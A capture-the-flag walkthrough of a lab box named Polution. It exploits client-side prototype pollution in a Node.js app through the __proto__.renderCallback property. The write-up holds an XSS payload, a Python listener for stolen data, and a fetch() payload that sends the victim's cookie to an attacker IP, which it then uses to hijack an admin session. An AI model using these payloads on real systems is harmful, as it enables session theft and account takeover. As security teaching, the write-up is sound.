---
title: "Polution"
date: 2026-1-11
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Polution on HackSmarter"
os: "Linux"
platform: "HackSmarter"
tags: [HackSmarter, protoype pollution, NodeJS]
comments: false
---

Polution is an easy rated box from [Hacksmarter](https://www.hacksmarter.org "Ctrl+Click to open URL"). You’re provided with an initial set of credentials, and your goal is to perform privilege escalation to gain administrator access as shown below:

![Polution Scope](/images/Polution1.png)

I ran `nmap -A 10.1.59.199 -oA polution` to find which ports were open. It apperas the site is running on a nodejs server.

![Polution nmap](/images/Polution2.png)

Pulling up the NodeJS site presents a login page. I logged in with the provided credentials.

![Polution website login](/images/Polution3.png)

Once logged in, there’s 3 separate sections: **Audit Logs, Webmail,** and **Incident Response**. I’m able to access the first two, but not the **Incident Response** section as shown below:

![Polution Website dashboard](/images/Polution4.png)

![Polution Website forbidden](/images/Polution5.png)


I returned to the audit logs page, and reviewed the source code. As the name suggests, this is vulnerable to prototype pollution. The vulnerable code is boxed in red below:

![Polution vulnerable javascript](/images/Polution6.png)

The reason this is vulnerable is because there’s nothing blocking the use of various keys like `constructor` or `__proto__` which can be used to an attacker’s advantage. We will be taking advantage of the `renderCallback` property to test XSS. What I used is shown below:

```
http://10.1.59.199:3000/dashboard/#__proto__.renderCallback=<img src=x onerror=alert("vulnerable")>
```

As expected, this pops up an alert box showing the word vulnerable. This means that this is vulnerable to prototype pollution!

![Polution XSS example](/images/Polution7.png)

Next, I assumed we need to get access to the admin user in order to view the incident response page. I created a python listener script as shown below:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class SimpleLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"\n[+] Incoming Request: {self.path}")
        # Parse the query parameters
        parsed_path = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed_path.query)
        if 'c' in params:
            print(f"[!] Stolen Data: {params['c'][0]}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Logged")

print("Listening on port 8000...")
HTTPServer(('0.0.0.0', 8000), SimpleLogger).serve_forever()
```

I saved this as [listener.py](http://listener.py "Ctrl+Click to open URL") and then ran it with `python3 listener.py` on my attacker machine. Back on the web application, I input the following in the message field and clicked on **Send Secure Message**:

```
http://10.1.59.199:3000/dashboard/#__proto__.renderCallback=<script>fetch('http://10.200.29.95:8000?c='+btoa(document.cookie))</script>
```

This abuses the renderCallback object and is sending the cookie to our attacker machine. The btoa portion base64 encodes the cookie in case there’s any weird characters that could cause issues.

![Polution website email](/images/Polution8.png)

After a few moments, I receive the following response in my listener on my attacker machine:

![Polution response](/images/Polution9.png)

I decoded this with `echo “c2Vzc2lvbj1IU19BRE1JTl83NzIxX1NFQ1VSRV9BVVRIX1RPS0VOOyB1c2VyPWFkbWlu” | base64 -d` , which returns the following:

![Polution decode response](/images/Polution10.png)

Now that we have the values for the admin’s token, let’s update our session cookie to match. Pull up developer tools and in the Storage tab, update the values to those uncovered above:

![Polution update session cookie](/images/Polution11.png)

Reload the webpage and your user should now be admin in the upper right hand corner:

![Polution admin user](/images/Polution12.png)

Navigating to the Incident Response page now is no longer forbidden, and returns the flag:

![Polution flag](/images/Polution13.png)
